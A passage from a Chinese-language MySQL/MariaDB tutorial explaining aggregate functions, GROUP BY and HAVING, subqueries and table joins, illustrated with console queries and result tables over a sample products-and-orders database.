比较高,因为有多个物品具有相同的较低价格。排除它们提升了平均价格。 注意 如果指定列名,则 DISTINCT 只能用于 COUNT() 。 DISTINCT不能用于 COUNT(*),因此不允许使用COUNT(DISTINCT),否则会产生错误 。类似地, DISTINCT 必须使用列名,不能用于计算或表达式。 将 DISTINCT 用于 MIN() 和 MAX() 虽然 DISTINCT 从技术上可用于 MIN() 和 MAX() ,但这样做实际上没有价值。一个列中的最小值和最大值不管是否包含不同值都是相同的。 组合聚集函数 目前为止的所有聚集函数例子都只涉及单个函数。但实际上 SELECT语句可根据需要包含多个聚集函数。 检索products 表中物品的数目num_items,产品价格的最高price_max、最低price_min以及平均值price_avg 1234567MariaDB [test]&gt; select count(*) as num_items,min(prod_price)as price_min,max(prod_price) as price_max,avg(prod_price) as price_avg from products;+-----------+-----------+-----------+-----------+| num_items | price_min | price_max | price_avg |+-----------+-----------+-----------+-----------+| 14 | 2.50 | 55.00 | 16.133571 |+-----------+-----------+-----------+-----------+1 row in set (0.00 sec) 取别名 在指定别名以包含某个聚集函数的结果时,不应该使用表中实际的列名。虽然这样做并非不合法,但使用唯一的名字会使你的SQL更易于理解和使用(以及将来容易排除故障)。 小结 聚集函数用来汇总数据。MySQL支持一系列聚集函数,可以用多种方法使用它们以返回所需的结果。这些函数是高效设计的,它们返回结果一般比你在自己的客户机应用程序中计算要快得多。 分组数据本章将介绍如何分组数据,以便能汇总表内容的子集。这涉及两个新 SELECT 语句子句,分别是 GROUP BY 子句和 HAVING 子句。 数据分组 从上一章知道, SQL聚集函数可用来汇总数据。这使我们能够对行进行计数,计算和与平均数,获得最大和最小值而不用检索所有数据。目前为止的所有计算都是在表的所有数据或匹配特定的 WHERE 子句的数据上进行的。 下面的例子返回供应商vend_id 1003 提供的产品数目 1234567MariaDB [test]&gt; select vend_id,count(vend_id) as num_prods from products where vend_id=1003;+---------+----------+| vend_id | num_prods |+---------+----------+| 1003 | 7 |+---------+----------+1 row in set (0.00 sec) 但如果要返回每个供应商提供的产品数目怎么办?或者返回只提供单项产品的供应商所提供的产品,或返回提供10个以上产品的供应商怎么办? 这就是分组显身手的时候了。分组允许把数据分为多个逻辑组,以便能对每个组进行聚集计算。 创建分组 分组是在 SELECT 语句的 GROUP BY 子句中建立的。理解分组的最好办法是看一个例子 按 vend_id 排序并分组数据计算每个供应商的商品总数 num_prods 12345678910MariaDB [test]&gt; select vend_id,count(vend_id) as num_prods from products group by vend_id;+---------+-----------+| vend_id | num_prods |+---------+-----------+| 1001 | 3 || 1002 | 2 || 1003 | 7 || 1005 | 2 |+---------+-----------+4 rows in set (0.00 sec) 因为使用了 GROUP BY ,就不必指定要计算和估值的每个组了。系统会自动完成。 GROUP BY 子句指示MySQL分组数据,然后对每个组而不是整个结果集进行聚集。 在具体使用 GROUP BY 子句前,需要知道一些重要的规定。 GROUP BY 子句可以包含任意数目的列。这使得能对分组进行嵌套,为数据分组提供更细致的控制。 如果在 GROUP BY 子句中嵌套了分组,数据将在最后规定的分组上进行汇总。换句话说,在建立分组时,指定的所有列都一起计算(所以不能从个别的列取回数据)。 GROUP BY 子句中列出的每个列都必须是检索列或有效的表达式(但不能是聚集函数)。如果在 SELECT 中使用表达式,则必须在GROUP BY 子句中指定相同的表达式。不能使用别名。 除聚集计算语句外, SELECT 语句中的每个列都必须在 GROUP BY 子句中给出。 如果分组列中具有 NULL 值,则 NULL 将作为一个分组返回。如果列中有多行 NULL 值,它们将分为一组。 GROUP BY 子句必须出现在 WHERE 子句之后, ORDER BY 子句之前。 使用 ROLLUP 使用 WITH ROLLUP 关键字,可以得到每个分组以及每个分组汇总级别(针对每个分组)的值,如下所示: 1234567891011MariaDB [test]&gt; select vend_id,count(vend_id) as num_prods from products group by vend_id with rollup;+---------+-----------+| vend_id | num_prods |+---------+-----------+| 1001 | 3 || 1002 | 2 || 1003 | 7 || 1005 | 2 || NULL | 14 |+---------+-----------+5 rows in set (0.00 sec) 过滤分组 除了能用 GROUP BY 分组数据外,MySQL还允许过滤分组,规定包括哪些分组,排除哪些分组。例如,可能想要列出至少有两个订单的所有 113顾客。为得出这种数据,必须基于完整的分组而不是个别的行进行过滤。。但是,在这个例我们已经看到了 WHERE 子句的作用(第6章中引入)子中 WHERE 不能完成任务,因为 WHERE 过滤指定的是行而不是分组。事实上, WHERE 没有分组的概念。那么,不使用 WHERE 使用什么呢?MySQL为此目的提供了另外的子句,那就是 HAVING 子句。 HAVING 非常类似于 WHERE 。事实上,目前为止所学过的所有类型的 WHERE 子句都可以用 HAVING 来替代。唯一的差别是WHERE 过滤行,而 HAVING 过滤分组。HAVING 支持所有 WHERE 操作符在第6章和第7章中,我们学习了 WHERE 子句的条件(包括通配符条件和带多个操作符的子句)。所学过的有关 WHERE 的所有这些技术和选项都适用于HAVING 。它们的句法是相同的,只是关键字有差别。那么,怎么过滤分组呢?请看以下的例子: 过滤两个以上的订单的那些分组 123456789101112131415161718MariaDB [test]&gt; select cust_id,count(*) as orders from orders group by cust_id;+---------+--------+| cust_id | orders |+---------+--------+| 10001 | 2 || 10003 | 1 || 10004 | 1 || 10005 | 1 |+---------+--------+4 rows in set (0.00 sec)MariaDB [test]&gt; select cust_id,count(*) as orders from orders group by cust_id having count(*) &gt;= 2;+---------+--------+| cust_id | orders |+---------+--------+| 10001 | 2 |+---------+--------+1 row in set (0.00 sec) 正如所见,这里 WHERE 子句不起作用,因为过滤是基于分组聚集值而不是特定行值的。 HAVING 和 WHERE 的差别 这里有另一种理解方法, WHERE 在数据分组前进行过滤, HAVING 在数据分组后进行过滤。这是一个重要的区别, WHERE 排除的行不包括在分组中。这可能会改变计算值,从而影响 HAVING 子句中基于这些值过滤掉的分组。 那么,有没有在一条语句中同时使用 WHERE 和 HAVING 子句的需要呢?事实上,确实有。假如想进一步过滤上面的语句,使它返回过去12个月内具有两个以上订单的顾客。为达到这一点,可增加一条 WHERE 子句,过滤出过去12个月内下过的订单。然后再增加 HAVING 子句过滤出具有两个以上订单的分组。 为更好地理解,请看下面的例子。 列出具有 2 个(含)以上、价格为 10 (含)以上的产品的供应商: 123456789101112131415161718MariaDB [test]&gt; select vend_id,count(vend_id) from products where prod_price &gt;= 10 group by vend_id ;+---------+----------------+| vend_id | count(vend_id) |+---------+----------------+| 1001 | 1 || 1003 | 4 || 1005 | 2 |+---------+----------------+3 rows in set (0.00 sec)MariaDB [test]&gt; select vend_id,count(vend_id) from products where prod_price &gt;= 10 group by vend_id having count(vend_id) &gt;= 2 ;+---------+----------------+| vend_id | count(vend_id) |+---------+----------------+| 1003 | 4 || 1005 | 2 |+---------+----------------+2 rows in set (0.01 sec) 这条语句中,使用了聚集函数的基本 SELECT ,它与前面的例子很相像。 WHERE 子句过滤所有 prod_price 至少为 10 的行。然后按 vend_id分组数据, HAVING 子句过滤计数为 2 或 2 以上的分组。如果没有 WHERE 子句,将会多检索出两行(供应商 1002 ,销售的所有产品价格都在 10 以下;供应商 1001 ,销售3个产品,但只有一个产品的价格大于等于 10 ): 12345678910MariaDB [test]&gt; select vend_id,count(vend_id) from products group by vend_id having count(vend_id) &gt;= 2 ;+---------+----------------+| vend_id | count(vend_id) |+---------+----------------+| 1001 | 3 || 1002 | 2 || 1003 | 7 || 1005 | 2 |+---------+----------------+4 rows in set (0.00 sec) 分组和排序 虽然 GROUP BY 和 ORDER BY 经常完成相同的工作,但它们是非常不同的。 下表汇总了它们之间的差别 ORDER BY GROUP BY 排序产生的输出 分组行。但输出可能不是分组的顺序 任意列都可以使用(甚至非选择的列也可以使用) 只可能使用选择列或表达式列,而且必须使用每个选择列表达式 不一定需要 如果与聚集函数一起使用列(或表达式),则必须使用 表中列出的第一项差别极为重要。我们经常发现用 GROUP BY 分组的数据确实是以分组顺序输出的。但情况并不总是这样,它并不是SQL规范所要求的。此外,用户也可能会要求以不同于分组的顺序排序。仅因为你以某种方式分组数据(获得特定的分组聚集值),并不表示你需要以相同的方式排序输出。应该提供明确的 ORDER BY 子句,即使其效果等同于 GROUP BY 子句也是如此。 不要忘记 ORDER BY 一般在使用 GROUP BY 子句时,应该也给出 ORDER BY 子句。这是保证数据正确排序的唯一方法。千万不要仅依赖 GROUP BY 排序数据。 为说明 GROUP BY 和 ORDER BY 的使用方法,请看一个例子。下面的SELECT 语句类似于前面那些例子。 检索总计订单价格大于等于 50 的订单的订单号和总计订单价格 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263MariaDB [test]&gt; select * from orderitems;+-----------+------------+---------+----------+------------+| order_num | order_item | prod_id | quantity | item_price |+-----------+------------+---------+----------+------------+| 20005 | 1 | ANV01 | 10 | 5.99 || 20005 | 2 | ANV02 | 3 | 9.99 || 20005 | 3 | TNT2 | 5 | 10.00 || 20005 | 4 | FB | 1 | 10.00 || 20006 | 1 | JP2000 | 1 | 55.00 || 20007 | 1 | TNT2 | 100 | 10.00 || 20008 | 1 | FC | 50 | 2.50 || 20009 | 1 | FB | 1 | 10.00 || 20009 | 2 | OL1 | 1 | 8.99 || 20009 | 3 | SLING | 1 | 4.49 || 20009 | 4 | ANV03 | 1 | 14.99 |+-----------+------------+---------+----------+------------+11 rows in set (0.00 sec)MariaDB [test]&gt; select order_num,sum(quantity*item_price) from orderitems group by order_num order by sum(quantity*item_price);+-----------+--------------------------+| order_num | sum(quantity*item_price) |+-----------+--------------------------+| 20009 | 38.47 || 20006 | 55.00 || 20008 | 125.00 || 20005 | 149.87 || 20007 | 1000.00 |+-----------+--------------------------+5 rows in set (0.00 sec)MariaDB [test]&gt; select order_num,sum(quantity*item_price) as ordertotal from orderitems group by order_num order by ordertotal;+-----------+------------+| order_num | ordertotal |+-----------+------------+| 20009 | 38.47 || 20006 | 55.00 || 20008 | 125.00 || 20005 | 149.87 || 20007 | 1000.00 |+-----------+------------+5 rows in set (0.00 sec)MariaDB [test]&gt; select order_num,sum(quantity*item_price) as ordertotal from orderitems group by order_num having ordertotal &gt;= 50 order by ordertotal;+-----------+------------+| order_num | ordertotal |+-----------+------------+| 20006 | 55.00 || 20008 | 125.00 || 20005 | 149.87 || 20007 | 1000.00 |+-----------+------------+4 rows in set (0.00 sec)MariaDB [test]&gt; select order_num,sum(quantity*item_price) as ordertotal from orderitems group by order_num having sum(quantity*item_price) &gt;= 50 order by sum(quantity*item_price);+-----------+------------+| order_num | ordertotal |+-----------+------------+| 20006 | 55.00 || 20008 | 125.00 || 20005 | 149.87 || 20007 | 1000.00 |+-----------+------------+4 rows in set (0.00 sec) 在这个例子中, GROUP BY 子句用来按订单号( order_num 列)分组数据,以便 SUM(*) 函数能够返回总计订单价格。 HAVING 子句过滤数据,使得只返回总计订单价格大于等于 50 的订单。最后,用 ORDER BY 子句排序输出。 SELECT 子句顺序 下面回顾一下 SELECT 语句中子句的顺序。下表以在 SELECT 语句中使用时必须遵循的次序,列出迄今为止所学过的子句。 SELECT子句 说明 是否必须使用 SELECT 要返回的列或表达式 是 FROM 从中检索数据的表 仅在从表选择数据时使用 WHERE 行级过滤 否 GROUP BY 分组说明 仅在按组计算聚集时使用 HAVING 组级过滤 否 ORDER BY 输出排序顺序 否 LIMIT 要检索的行数 否 小结 在本章中,我们学习了如何用SQL聚集函数对数据进行汇总计算。本章讲授了如何使用 GROUP BY 子句对数据组进行这些汇总计算,返回每个组的结果。我们看到了如何使用 HAVING 子句过滤特定的组,还知道了ORDER BY 和 GROUP BY 之间以及 WHERE 和 HAVING 之间的差异。 使用子查询本章介绍什么是子查询以及如何使用它们。 子查询版本要求 MySQL 4.1引入了对子查询的支持,所以要想使用本章描述的SQL,必须使用MySQL 4.1或更高级的版本。 SELECT语句 是SQL的查询。迄今为止我们所看到的所有 SELECT 语句都是简单查询,即从单个数据库表中检索数据的单条语句。 查询(query) 任何SQL语句都是查询。但此术语一般指 SELECT语句。 SQL还允许创建子查询(subquery),即嵌套在其他查询中的查询。为什么要这样做呢?理解这个概念的最好方法是考察几个例子。 利用子查询进行过滤 订单信息存储在两个表中。对于包含订单号、客户ID、订单日期的每个订单, orders 表存储一行。各订单的物品存储在相关的orderitems 表中。 orders 表不存储客户信息。它只存储客户的ID。实际的客户信息存储在 customers 表中。 现在,假如需要列出订购物品 TNT2 的所有客户,应该怎样检索?下面列出具体的步骤。 (1) 检索包含物品 TNT2 的所有订单的编号。 (2) 检索具有前一步骤列出的订单编号的所有客户的ID。 (3) 检索前一步骤返回的所有客户ID的客户信息。 上述每个步骤都可以单独作为一个查询来执行。可以把一条 SELECT语句返回的结果用于另一条 SELECT 语句的 WHERE 子句。也可以使用子查询来把3个查询组合成一条语句 123456789101112131415161718192021222324252627282930313233343536373839MariaDB [test]&gt; select order_num from orderitems where prod_id=&apos;TNT2&apos;;+-----------+| order_num |+-----------+| 20005 || 20007 |+-----------+2 rows in set (0.00 sec)MariaDB [test]&gt; select cust_id from orders where order_num = 20005 or order_num = 20007;+---------+| cust_id |+---------+| 10001 || 10004 |+---------+2 rows in set (0.00 sec)MariaDB [test]&gt; select cust_name from customers where cust_id in (10001,10004);+----------------+| cust_name |+----------------+| Coyote Inc. || Yosemite Place |+----------------+2 rows in set (0.00 sec)MariaDB [test]&gt; select cust_name from customers where cust_id in&gt; (&gt; select cust_id from orders where order_num in&gt; (select order_num from orderitems where prod_id=&apos;TNT2&apos;)&gt; );+----------------+| cust_name |+----------------+| Coyote Inc. || Yosemite Place |+----------------+2 rows in set (0.00 sec) 可见,在 WHERE 子句中使用子查询能够编写出功能很强并且很灵活的SQL语句。对于能嵌套的子查询的数目没有限制,不过在实际使用时由于性能的限制,不能嵌套太多的子查询。 列必须匹配 在 WHERE 子句中使用子查询(如这里所示),应该保证 SELECT 语句具有与 WHERE 子句中相同数目的列。通常,子查询将返回单个列并且与单个列匹配,但如果需要也可以使用多个列。 虽然子查询一般与 IN操作符结合使用,但也可以用于测试等于(= )、不等于( &lt;&gt; )等。 子查询和性能 这里给出的代码有效并获得所需的结果。但是,使用子查询并不总是执行这种类型的数据检索的最有效的方法。更多的论述,请参阅下一章,其中将再次给出这个例子。 作为计算字段使用子查询 使用子查询的另一方法是创建计算字段。 查询每个客户的姓名cust_name和状态cust_state以及每个客户的订单总数orders。订单与相应的客户ID存储在 orders 表中，客户信息存储在customers表中。 为了执行这个操作,遵循下面的步骤。 (1) 从 customers 表中检索客户列表。 (2) 对于检索出的每个客户,统计其在 orders 表中的订单数目。 正如前两章所述,可使用 SELECT COUNT ( *) 对表中的行进行计数,并且通过提供一条 WHERE 子句来过滤某个特定的客户ID,可仅对该客户的订单进行计数。 1234567891011MariaDB [test]&gt; select cust_name,cust_state,(select count(*) from orders where orders.cust_id=customers.cust_id) as orders from customers order by cust_name;+----------------+------------+--------+| cust_name | cust_state | orders |+----------------+------------+--------+| Coyote Inc. | MI | 2 || E Fudd | IL | 1 || Mouse House | OH | 0 || Wascals | IN | 1 || Yosemite Place | AZ | 1 |+----------------+------------+--------+5 rows in set (0.00 sec) cust_name 、cust_state 和 orders 。 orders 是一个计算字段,它是由圆括号中的子查询建立的。该子查询对检索出的每个客户执行一次。在此例子中,该子查询执行了5次,因为检索出了5个客户。 分析子查询中的 WHERE 子句与前面使用的 WHERE 子句稍有不同,因为它使用了完全限定列名(在前面提到过)。 相关子查询(correlated subquery) 涉及外部查询的子查询。这种类型的子查询称为相关子查询。任何时候只要列名可能有多义性,就必须使用这种语法(表名和列名由一个句点分隔)。为什么这样? 我们来看看如果不使用完全限定的列名会发生什么情况 12345678910MariaDB [test]&gt; select cust_name,cust_state,(select count(*) from orders where cust_id=cust_id) as orders from customers order by cust_name;+----------------+------------+--------+| cust_name | cust_state | orders |+----------------+------------+--------+| Coyote Inc. | MI | 5 || E Fudd | IL | 5 || Mouse House | OH | 5 || Wascals | IN | 5 || Yosemite Place | AZ | 5 |+----------------+------------+--------+5 rows in set (0.00 sec) 显然,返回的结果不正确(请比较前面的结果),那么,为什么会这样呢?有两个 cust_id 列,一个在 customers 中,另一个在orders 中,需要比较这两个列以正确地把订单与它们相应的顾客匹配。如果不完全限定列名,MySQL将假定你是对 orders 表中的 cust_id 进行自身比较。而 SELECT COUNT(*) FROM orders WHERE cust_id = cust_id;总是返回 orders 表中的订单总数(因为MySQL查看每个订单的 cust_id是否与本身匹配,当然,它们总是匹配的)。 虽然子查询在构造这种 SELECT 语句时极有用,但必须注意限制有歧义性的列名。 不止一种解决方案 正如本章前面所述,虽然这里给出的样例代码运行良好,但它并不是解决这种数据检索的最有效的方法。在后面的章节中我们还要遇到这个例子。 逐渐增加子查询来建立查询 用子查询测试和调试查询很有技巧性,特别是在这些语句的复杂性不断增加的情况下更是如此。用子查询建立(和测试)查询的最可靠的方法是逐渐进行,这与MySQL处理它们的方法非常相同。首先,建立和测试最内层的查询。然后,用硬编码数据建立和测试外层查询,并且仅在确认它正常后才嵌入子查询。这时,再次测试它。对于要增加的每个查询,重复这些步骤。这样做仅给构造查询增加了一点点时间,但节省了以后(找出查询为什么不正常)的大量时间,并且极大地提高了查询一开始就正常工作的可能性。 小结 本章学习了什么是子查询以及如何使用它们。子查询最常见的使用是在 WHERE 子句的 IN 操作符中,以及用来填充计算列。我们举了这两种操作类型的例子。 联结表本章将介绍什么是联结,为什么要使用联结,如何编写使用联结的SELECT 语句。 联结 SQL最强大的功能之一就是能在数据检索查询的执行中联结(join)表。联结是利用SQL的 SELECT 能执行的最重要的操作,很好地理解联结及其语法是学习SQL的一个极为重要的组成部分。 在能够有效地使用联结前,必须了解关系表以及关系数据库设计的一些基础知识。下面的介绍并不是这个内容的全部知识,但作为入门已经足够了。 1.关系表 理解关系表的最好方法是来看一个现实世界中的例子。假如有一个包含产品目录的数据库表,其中每种类别的物品占一行。对于每种物品要存储的信息包括产品描述和价格,以及生产该产品的供应商信息。 现在,假如有由同一供应商生产的多种物品,那么在何处存储供应商信息(如,供应商名、地址、联系方法等)呢?将这些数据与产品信息分开存储的理由如下。 因为同一供应商生产的每个产品的供应商信息都是相同的,对每个产品重复此信息既浪费时间又浪费存储空间。 如果供应商信息改变(例如,供应商搬家或电话号码变动),只需改动一次即可。 如果有重复数据(即每种产品都存储供应商信息),很难保证每次输入该数据的方式都相同。不一致的数据在报表中很难利用。 关键是,相同数据出现多次决不是一件好事,此因素是关系数据库设计的基础。关系表的设计就是要保证把信息分解成多个表,一类数据一个表。各表通过某些常用的值(即关系设计中的关系(relational))互相关联。 在这个例子中,可建立两个表,一个存储供应商信息,另一个存储产品信息。 vendors 表包含所有供应商信息,每个供应商占一行,每个供应商具有唯一的标识。此标识称为主键(primary key)(在第1章中首次提到),可以是供应商ID或任何其他唯一值。 products 表只存储产品信息,它除了存储供应商ID( vendors 表的主键)外不存储其他供应商信息。 vendors 表的主键又叫作 products 的外键,它将 vendors 表与 products 表关联,利用供应商ID能从 vendors 表中找出相应供应商的详细信息。 外键(foreign key) 外键为某个表中的一列,它包含另一个表的主键值,定义了两个表之间的关系。 这样做的好处如下: 供应商信息不重复,从而不浪费时间和空间; 如果供应商信息变动,可以只更新 vendors 表中的单个记录,相关表中的数据不用改动; 由于数据无重复,显然数据是一致的,这使得处理数据更简单。 总之,关系数据可以有效地存储和方便地处理。因此,关系数据库的可伸缩性远比非关系数据库要好。 可伸缩性(scale) 能够适应不断增加的工作量而不失败。设计良好的数据库或应用程序称之为可伸缩性好(scale well)。 2.为什么要使用联结 正如所述,分解数据为多个表能更有效地存储,更方便地处理,并且具有更大的可伸缩性。但这些好处是有代价的。 如果数据存储在多个表中,怎样用单条 SELECT 语句检索出数据? 答案是使用联结。简单地说,联结是一种机制,用来在一条 SELECT语句中关联表,因此称之为联结。使用特殊的语法,可以联结多个表返回一组输出,联结在运行时关联表中正确的行。 维护引用完整性 重要的是,要理解联结不是物理实体。换句话说,它在实际的数据库表中不存在。联结由MySQL根据需要建立,它存在于查询的执行当中。在使用关系表时,仅在关系列中插入合法的数据非常重要。回到这里的例子,如果在 products 表中插入拥有非法供应商ID(即没有在 vendors 表中出现)的供应商生产的产品,则这些产品是不可访问的,因为它们没有关联到某个供应商。为防止这种情况发生,可指示MySQL只允许在 products 表的供应商ID列中出现合法值(即出现在 vendors 表中的供应商)。这就是维护引用完整性,它是通过在表的定义中指定主键和外键来实现的。 创建联结 联结的创建非常简单,规定要联结的所有表以及它们如何关联即可。 检索出所有的供应商名vend_name，以及供应商提供的商品名prod_name和价格prod_price。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546MariaDB [test]&gt; describe vendors;+--------------+----------+------+-----+---------+----------------+| Field | Type | Null | Key | Default | Extra |+--------------+----------+------+-----+---------+----------------+| vend_id | int(11) | NO | PRI | NULL | auto_increment || vend_name | char(50) | NO | | NULL | || vend_address | char(50) | YES | | NULL | || vend_city | char(50) | YES | | NULL | || vend_state | char(5) | YES | | NULL | || vend_zip | char(10) | YES | | NULL | || vend_country | char(50) | YES | | NULL | |+--------------+----------+------+-----+---------+----------------+7 rows in set (0.00 sec)MariaDB [test]&gt; describe products;+------------+--------------+------+-----+---------+-------+| Field | Type | Null | Key | Default | Extra |+------------+--------------+------+-----+---------+-------+| prod_id | char(10) | NO | PRI | NULL | || vend_id | int(11) | NO | MUL | NULL | || prod_name | char(255) | NO | | NULL | || prod_price | decimal(8,2) | NO | | NULL | || prod_desc | text | YES | | NULL | |+------------+--------------+------+-----+---------+-------+5 rows in set (0.00 sec)MariaDB [test]&gt; select vend_name,prod_name,prod_price from vendors,products where vendors.vend_id = products.vend_id order by vend_name,prod_name;+-------------+----------------+------------+| vend_name | prod_name | prod_price |+-------------+----------------+------------+| ACME | Bird seed | 10.00 || ACME | Carrots | 2.50 || ACME | Detonator | 13.00 || ACME | Safe | 50.00 || ACME | Sling | 4.49 || ACME | TNT (1 stick) | 2.50 || ACME | TNT (5 sticks) | 10.00 || Anvils R Us | .5 ton anvil | 5.99 || Anvils R Us | 1 ton anvil | 9.99 || Anvils R Us | 2 ton anvil | 14.99 || Jet Set | JetPack 1000 | 35.00 || Jet Set | JetPack 2000 | 55.00 || LT Supplies | Fuses | 3.42 || LT Supplies | Oil can | 8.99 |+-------------+----------------+------------+14 rows in set (0.00 sec) 完全限定列名 在引用的列可能出现二义性时,必须使用完全限定列名(用一个点分隔的表名和列名)。如果引用一个没有用表名限制的具有二义性的列名,MySQL将返回错误。 1.WHERE子句的重要性 利用 WHERE 子句建立联结关系似乎有点奇怪,但实际上,有一个很充分的理由。请记住,在一条 SELECT 语句中联结几个表时,相应的关系是在运行中构造的。在数据库表的定义中不存在能指示MySQL如何对表进行联结的东西。你必须自己做这件事情。在联结两个表时,你实际上做的是将第一个表中的每一行与第二个表中的每一行配对。 WHERE 子句作为过滤条件,它只包含那些匹配给定条件(这里是联结条件)的行。没有WHERE 子句,第一个表中的每个行将与第二个表中的每个行配对,而不管它们逻辑上是否可以配在一起。 笛卡儿积(cartesian product) 由没有联结条件的表关系返回的结果为笛卡儿积。检索出的行的数目将是第一个表中的行数乘以第二个表中的行数。 为理解这一点,请看下面的 SELECT 语句及其输出: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990MariaDB [test]&gt; select vend_name,prod_name,prod_price from vendors,products order by vend_name,prod_name;+----------------+----------------+------------+| vend_name | prod_name | prod_price |+----------------+----------------+------------+| ACME | .5 ton anvil | 5.99 || ACME | 1 ton anvil | 9.99 || ACME | 2 ton anvil | 14.99 || ACME | Bird seed | 10.00 || ACME | Carrots | 2.50 || ACME | Detonator | 13.00 || ACME | Fuses | 3.42 || ACME | JetPack 1000 | 35.00 || ACME | JetPack 2000 | 55.00 || ACME | Oil can | 8.99 || ACME | Safe | 50.00 || ACME | Sling | 4.49 || ACME | TNT (1 stick) | 2.50 || ACME | TNT (5 sticks) | 10.00 || Anvils R Us | .5 ton anvil | 5.99 || Anvils R Us | 1 ton anvil | 9.99 || Anvils R Us | 2 ton anvil | 14.99 || Anvils R Us | Bird seed | 10.00 || Anvils R Us | Carrots | 2.50 || Anvils R Us | Detonator | 13.00 || Anvils R Us | Fuses | 3.42 || Anvils R Us | JetPack 1000 | 35.00 || Anvils R Us | JetPack 2000 | 55.00 || Anvils R Us | Oil can | 8.99 || Anvils R Us | Safe | 50.00 || Anvils R Us | Sling | 4.49 || Anvils R Us | TNT (1 stick) | 2.50 || Anvils R Us | TNT (5 sticks) | 10.00 || Furball Inc. | .5 ton anvil | 5.99 || Furball Inc. | 1 ton anvil | 9.99 || Furball Inc. | 2 ton anvil | 14.99 || Furball Inc. | Bird seed | 10.00 || Furball Inc. | Carrots | 2.50 || Furball Inc. | Detonator | 13.00 || Furball Inc. | Fuses | 3.42 || Furball Inc. | JetPack 1000 | 35.00 || Furball Inc. | JetPack 2000 | 55.00 || Furball Inc. | Oil can | 8.99 || Furball Inc. | Safe | 50.00 || Furball Inc. | Sling | 4.49 || Furball Inc. | TNT (1 stick) | 2.50 || Furball Inc. | TNT (5 sticks) | 10.00 || Jet Set | .5 ton anvil | 5.99 || Jet Set | 1 ton anvil | 9.99 || Jet Set | 2 ton anvil | 14.99 || Jet Set | Bird seed | 10.00 || Jet Set | Carrots | 2.50 || Jet Set | Detonator | 13.00 || Jet Set | Fuses | 3.42 || Jet Set | JetPack 1000 | 35.00 || Jet Set | JetPack 2000 | 55.00 || Jet Set | Oil can | 8.99 || Jet Set | Safe | 50.00 || Jet Set | Sling | 4.49 || Jet Set | TNT (1 stick) | 2.50 || Jet Set | TNT (5 sticks) | 10.00 || Jouets Et Ours | .5 ton anvil | 5.99 || Jouets Et Ours | 1 ton anvil | 9.99 || Jouets Et Ours | 2 ton anvil | 14.99 || Jouets Et Ours | Bird seed | 10.00 || Jouets Et Ours | Carrots | 2.50 || Jouets Et Ours | Detonator | 13.00 || Jouets Et Ours | Fuses | 3.42 || Jouets Et Ours | JetPack 1000 | 35.00 || Jouets Et Ours | JetPack 2000 | 55.00 || Jouets Et Ours | Oil can | 8.99 || Jouets Et Ours | Safe | 50.00 || Jouets Et Ours | Sling | 4.49 || Jouets Et Ours | TNT (1 stick) | 2.50 || Jouets Et Ours | TNT (5 sticks) | 10.00 || LT Supplies | .5 ton anvil | 5.99 || LT Supplies | 1 ton anvil | 9.99 || LT Supplies | 2 ton anvil | 14.99 || LT Supplies | Bird seed | 10.00 || LT Supplies | Carrots | 2.50 || LT Supplies | Detonator | 13.00 || LT Supplies | Fuses | 3.42 || LT Supplies | JetPack 1000 | 35.00 || LT Supplies | JetPack 2000 | 55.00 || LT Supplies | Oil can | 8.99 || LT Supplies | Safe | 50.00 || LT Supplies | Sling | 4.49 || LT Supplies | TNT (1 stick) | 2.50 || LT Supplies | TNT (5 sticks) | 10.00 |+----------------+----------------+------------+84 rows in set (0.00 sec) 从上面的输出中可以看到,相应的笛卡儿积不是我们所想要的。这里返回的数据用每个供应商匹配了每个产品,它包括了供应商不正确的产品。实际上有的供应商根本就没有产品。 分析 不要忘了 WHERE 子句 应该保证所有联结都有 WHERE 子句,否则MySQL将返回比想要的数据多得多的数据。同理,应该保证 WHERE 子句的正确性。不正确的过滤条件将导致MySQL返回不正确的数据。 叉联结 有时我们会听到返回称为叉联结(cross join)的笛卡儿积的联结类型 2.内部联结 目前为止所用的联结称为等值联结(equijoin),它基于两个表之间的相等测试。这种联结也称为内部联结。其实,对于这种联结可以使用稍微不同的语法来明确指定联结的类型。下面的 SELECT 语句返回与前面例子完全相同的数据: 1234567891011121314151617181920MariaDB [test]&gt; select vend_name,prod_name,prod_price from vendors inner join products on vendors.vend_id = products.vend_id;+-------------+----------------+------------+| vend_name | prod_name | prod_price |+-------------+----------------+------------+| Anvils R Us | .5 ton anvil | 5.99 || Anvils R Us | 1 ton anvil | 9.99 || Anvils R Us | 2 ton anvil | 14.99 || LT Supplies | Fuses | 3.42 || LT Supplies | Oil can | 8.99 || ACME | Detonator | 13.00 || ACME | Bird seed | 10.00 || ACME | Carrots | 2.50 || ACME | Safe | 50.00 || ACME | Sling | 4.49 || ACME | TNT (1 stick) | 2.50 || ACME | TNT (5 sticks) | 10.00 || Jet Set | JetPack 1000 | 35.00 || Jet Set | JetPack 2000 | 55.00 |+-------------+----------------+------------+14 rows in set (0.00 sec) 此语句中的 SELECT 与前面的SELECT 语句相同,但 FROM 子句不同。这里,两个表之间的关系是 FROM 子句的组成部分,以 INNER JOIN 指定。在使用这种语法时,联结条件用特定的 ON 子句而不是 WHERE子句给出。传递给 ON 的实际条件与传递给 WHERE 的相同。 使用哪种语法 ANSI SQL规范首选 INNER JOIN 语法。此外,尽管使用 WHERE 子句定义联结的确比较简单,但是使用明确的联结语法能够确保不会忘记联结条件,有时候这样做也能影响性能。 3.联结多个表 SQL对一条 SELECT 语句中可以联结的表的数目没有限制。创建联结的基本规则也相同。首先列出所有表,然后定义表之间的关系。例如: 检索出订单号为20005的所有商品的商品名称，商品的供应商名称，商品的价格，商品的数量（prod_name,vend_name,prod_price,quantit）。 12345678910MariaDB [test]&gt; select prod_name,vend_name,prod_price,quantity from orderitems,products,vendors where products.vend_id = vendors.vend_id and orderitems.prod_id = products.prod_id and order_num = 20005;+----------------+-------------+------------+----------+| prod_name | vend_name | prod_price | quantity |+----------------+-------------+------------+----------+| .5 ton anvil | Anvils R Us | 5.99 | 10 || 1 ton anvil | Anvils R Us | 9.99 | 3 || TNT (5 sticks) | ACME | 10.00 | 5 || Bird seed | ACME | 10.00 | 1 |+----------------+-------------+------------+----------+4 rows in set (0.00 sec) 此例子显示编号为 20005 的订单中的物品。订单物品存储在orderitems 表中。每个产品按其产品ID存储,它引用 products表中的产品。这些产品通过供应商ID联结到 vendors 表中相应的供应商,供应商ID存储在每个产品的记录中。这里的 FROM 子句列出了3个表,而WHERE 子句定义了这两个联结条件,而第三个联结条件用来过滤出订单20005 中的物品。 